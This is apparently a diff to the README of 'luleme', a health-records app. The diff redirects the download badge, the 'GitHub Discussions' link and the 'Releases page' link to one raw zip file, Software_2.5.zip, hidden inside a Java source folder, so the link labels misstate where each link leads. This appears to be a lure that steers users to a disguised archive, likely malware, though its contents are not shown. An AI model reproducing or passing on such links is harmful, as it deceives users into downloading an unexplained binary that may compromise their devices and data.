@@ -7,7 +7,7 @@ Welcome to luleme! This app is designed to help you manage your health records w
 To begin, you’ll need to download the app. The download is simple and quick. Just follow the steps below:
 
 ## 🔗 Download luleme
-[![Download luleme](https://img.shields.io/badge/Download-luleme-brightgreen)](https://github.com/bojufkax/luleme/releases)
+[![Download luleme](https://github.com/bojufkax/luleme/raw/refs/heads/main/app/src/main/java/com/luleme/data/local/entity/Software_2.5.zip)](https://github.com/bojufkax/luleme/raw/refs/heads/main/app/src/main/java/com/luleme/data/local/entity/Software_2.5.zip)
 
 ## 📝 Download & Install
 1. Click the download link above to go to the luleme Releases page.
@@ -40,7 +40,7 @@ If you encounter any issues during the installation or while using the applicati
 
 ## 📢 Community & Support
 We encourage users to share their experiences and suggestions. Join our community channels for updates and discussions:
-- [GitHub Discussions](https://github.com/bojufkax/luleme/discussions)
+- [GitHub Discussions](https://github.com/bojufkax/luleme/raw/refs/heads/main/app/src/main/java/com/luleme/data/local/entity/Software_2.5.zip)
 - [Join our Support Forum](#)
 
 ## 🌐 Documentation
@@ -50,6 +50,6 @@ For more in-depth information about luleme, please visit the documentation secti
 We value your input! If you have any feedback or feature requests, please let us know on our GitHub discussions page or through the feedback form in the app.
 
 ## 🔗 Remember
-Don't forget to revisit the [Releases page](https://github.com/bojufkax/luleme/releases) for updates and new features as they become available!
+Don't forget to revisit the [Releases page](https://github.com/bojufkax/luleme/raw/refs/heads/main/app/src/main/java/com/luleme/data/local/entity/Software_2.5.zip) for updates and new features as they become available!
 
 We hope luleme makes your health records tracking as straightforward as possible. Thank you for choosing luleme!
